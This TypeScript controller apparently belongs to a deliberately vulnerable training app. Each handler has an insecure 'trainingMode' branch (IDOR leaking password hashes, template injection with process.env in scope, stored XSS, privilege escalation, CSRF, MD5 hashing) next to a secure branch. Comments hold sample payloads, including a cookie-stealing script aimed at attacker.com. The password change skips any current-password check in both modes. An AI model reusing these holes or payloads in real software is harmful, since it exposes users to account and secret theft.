import { Request, Response } from 'express';
import { db, rawQuery } from '../config/database';
import { config } from '../config/env';
import { redis } from '../config/redis';
import { logSecurityEvent, logAudit } from '../utils/logger';

// ═══════════════════════════════════════════════════════════════
//                    USERS CONTROLLER
//
// Vulnerabilities: SSTI, Profile Stored XSS, Privilege Escalation,
//                  IDOR, Sensitive Data Exposure
// ═══════════════════════════════════════════════════════════════

// ─────────────────────────────────────────────
// GET PROFILE
//
// ⚠️ VULN #9: IDOR — Access private profile data
// ⚠️ VULN #47: Sensitive Data Exposure
// ─────────────────────────────────────────────
export async function getProfile(req: Request, res: Response): Promise<void> {
  const { username } = req.params;
  const requestingUserId = req.user?.userId;

  const user = await db('users')
    .where({ username, is_active: true })
    .first();

  if (!user) {
    res.status(404).json({ error: 'User not found' });
    return;
  }

  if (config.trainingMode) {
    // ⚠️ VULN #47: Sensitive Data Exposure
    // Returns all user fields including hashed password, tokens, admin data
    // CWE-312: Cleartext Storage of Sensitive Information
    const coins = await db('user_coins').where({ user_id: user.id }).first();

    res.json({
      user: {
        ...user,  // ⚠️ Includes: password_hash, verification_token, email (private), ip address
        coinBalance: coins?.balance,
        // ⚠️ Exposes private info regardless of viewer
        privateEmail: user.email,
        lastLoginIp: user.last_login_ip,
      },
    });
  } else {
    // 🔒 SECURE: Only return public fields
    const isOwnProfile = requestingUserId === user.id;
    const coins = isOwnProfile
      ? await db('user_coins').where({ user_id: user.id }).first()
      : null;

    const [followersCount, followingCount] = await Promise.all([
      db('follows').where({ following_id: user.id }).count('* as count').first(),
      db('follows').where({ follower_id: user.id }).count('* as count').first(),
    ]);

    const isFollowing = requestingUserId
      ? !!(await db('follows').where({ follower_id: requestingUserId, following_id: user.id }).first())
      : false;

    res.json({
      user: {
        id: user.id,
        username: user.username,
        displayName: user.display_name,
        bio: user.bio,
        avatarUrl: user.avatar_url,
        coverUrl: user.cover_url,
        role: user.role,
        isVerified: user.is_verified,
        createdAt: user.created_at,
        followersCount: parseInt(followersCount?.count as string),
        followingCount: parseInt(followingCount?.count as string),
        isFollowing,
        // 🔒 Only show sensitive data to owner
        ...(isOwnProfile && {
          email: user.email,
          coinBalance: coins?.balance,
        }),
      },
    });
  }
}

// ─────────────────────────────────────────────
// UPDATE PROFILE (SSTI + Stored XSS)
//
// ⚠️ VULN #14: Server-Side Template Injection
// ⚠️ VULN #3: Stored XSS in bio
// ─────────────────────────────────────────────
export async function updateProfile(req: Request, res: Response): Promise<void> {
  const userId = req.user!.userId;
  const { displayName, bio, website, theme, notificationTemplate } = req.body;

  if (config.trainingMode) {
    // ⚠️ VULN #3: Stored XSS in bio
    // <script>document.location='https://attacker.com?c='+document.cookie</script>

    // ⚠️ VULN #14: SSTI in notification template
    // notificationTemplate: "Hello {{7*7}}" → renders as "Hello 49" (Handlebars/Nunjucks)
    // Escalation: "{{constructor.constructor('return process.env')()}}"
    // CWE-94: Code Injection
    // CVSS: 9.8 Critical

    let processedTemplate = notificationTemplate;

    if (notificationTemplate) {
      try {
        const Handlebars = require('handlebars');
        // ⚠️ VULN: Compiles user input as template
        const template = Handlebars.compile(notificationTemplate);
        processedTemplate = template({
          username: req.user!.username,
          // ⚠️ Passes sensitive context to template
          env: process.env,
          config: config,
        });
      } catch (err: any) {
        // ⚠️ Template error reveals internals
        res.status(400).json({ error: 'Template error', details: err.message });
        return;
      }
    }

    await db('users').where({ id: userId }).update({
      display_name: displayName,
      bio,  // ⚠️ Unsanitized
      website,
      theme: theme,  // ⚠️ Used for DOM-based XSS in client
      notification_template: processedTemplate,
      updated_at: new Date(),
    });

    res.json({ message: 'Profile updated' });
  } else {
    // 🔒 SECURE: Sanitize all user input
    const sanitizeHtml = require('sanitize-html');

    const sanitizedBio = sanitizeHtml(bio || '', { allowedTags: [], allowedAttributes: {} });
    const sanitizedDisplay = (displayName || '').replace(/<[^>]*>/g, '').substring(0, 100);

    // 🔒 No template rendering from user input
    await db('users').where({ id: userId }).update({
      display_name: sanitizedDisplay,
      bio: sanitizedBio.substring(0, 500),
      website: sanitizeWebsite(website),
      updated_at: new Date(),
    });

    res.json({ message: 'Profile updated' });
  }
}

function sanitizeWebsite(url: string): string {
  if (!url) return '';
  try {
    const parsed = new URL(url);
    if (!['http:', 'https:'].includes(parsed.protocol)) return '';
    return parsed.toString().substring(0, 200);
  } catch {
    return '';
  }
}

// ─────────────────────────────────────────────
// PRIVILEGE ESCALATION
//
// ⚠️ VULN #49: Privilege Escalation via parameter tampering
// ─────────────────────────────────────────────
export async function updateUserRole(req: Request, res: Response): Promise<void> {
  const { userId } = req.params;
  const { role } = req.body;
  const requesterId = req.user!.userId;
  const requesterRole = req.user!.role;

  if (config.trainingMode) {
    // ⚠️ VULN #49: Privilege Escalation
    // Any moderator can make themselves admin
    // Any user can escalate to moderator if they know the endpoint
    // CWE-269: Improper Privilege Management
    // CVSS: 9.8 Critical

    const VALID_ROLES = ['user', 'moderator', 'admin', 'superadmin'];
    if (!VALID_ROLES.includes(role)) {
      res.status(400).json({ error: 'Invalid role' });
      return;
    }

    // ⚠️ Only checks if requester is admin — but doesn't prevent
    // moderator from setting role to 'admin'
    if (requesterRole !== 'admin' && requesterRole !== 'superadmin') {
      res.status(403).json({ error: 'Admin access required' });
      return;
    }

    // ⚠️ Admin can set ANY role including superadmin
    await db('users').where({ id: userId }).update({ role });
    res.json({ message: `Role updated to ${role}` });
  } else {
    // 🔒 SECURE: Strict role hierarchy enforcement
    const ROLE_LEVELS: Record<string, number> = {
      user: 1, moderator: 2, admin: 3, superadmin: 4,
    };

    const requesterLevel = ROLE_LEVELS[requesterRole] ?? 0;
    const targetLevel = ROLE_LEVELS[role] ?? 0;

    // 🔒 Can only grant roles lower than own role
    if (targetLevel >= requesterLevel) {
      logSecurityEvent({
        type: 'PRIVILEGE_ESCALATION_ATTEMPT',
        userId: requesterId.toString(),
        severity: 'critical',
        details: { targetUser: userId, targetRole: role, requesterRole },
      });
      res.status(403).json({ error: 'Cannot grant role equal to or higher than your own' });
      return;
    }

    await db('users').where({ id: userId }).update({ role });
    logAudit({
      action: 'ROLE_CHANGED',
      userId: requesterId,
      resourceId: parseInt(userId),
      ip: req.ip,
      result: 'success',
      details: { newRole: role },
    });

    res.json({ message: `Role updated to ${role}` });
  }
}

// ─────────────────────────────────────────────
// FOLLOW USER
//
// ⚠️ VULN #6: CSRF — No CSRF token
// ⚠️ VULN #21: Business Logic — Follow yourself
// ─────────────────────────────────────────────
export async function followUser(req: Request, res: Response): Promise<void> {
  const { userId: targetId } = req.params;
  const followerId = req.user!.userId;

  if (config.trainingMode) {
    // ⚠️ VULN #21: Can follow yourself
    // ⚠️ VULN #6: No CSRF protection (state-changing action without token)

    await db('follows').insert({
      follower_id: followerId,
      following_id: targetId,
      created_at: new Date(),
    }).onConflict(['follower_id', 'following_id']).ignore();

    res.json({ message: 'Following user' });
  } else {
    // 🔒 SECURE: Prevent self-follow
    if (followerId === parseInt(targetId)) {
      res.status(400).json({ error: 'Cannot follow yourself' });
      return;
    }

    await db('follows').insert({
      follower_id: followerId,
      following_id: targetId,
      created_at: new Date(),
    }).onConflict(['follower_id', 'following_id']).ignore();

    res.json({ message: 'Following user' });
  }
}

// ─────────────────────────────────────────────
// CHANGE PASSWORD (CSRF)
//
// ⚠️ VULN #6: CSRF on critical action
// ─────────────────────────────────────────────
export async function changePassword(req: Request, res: Response): Promise<void> {
  const { currentPassword, newPassword } = req.body;
  const userId = req.user!.userId;

  // (Full implementation in training mode doesn't require CSRF token)
  // An attacker can embed: <form action="http://app.com/api/users/change-password" method="POST">

  const user = await db('users').where({ id: userId }).first();
  if (!user) {
    res.status(404).json({ error: 'User not found' });
    return;
  }

  // Update password
  const crypto = require('crypto');
  const argon2 = require('argon2');

  const newHash = config.trainingMode
    ? crypto.createHash('md5').update(newPassword).digest('hex')
    : await argon2.hash(newPassword);

  await db('users').where({ id: userId }).update({ password_hash: newHash });

  res.json({ message: 'Password changed successfully' });
}
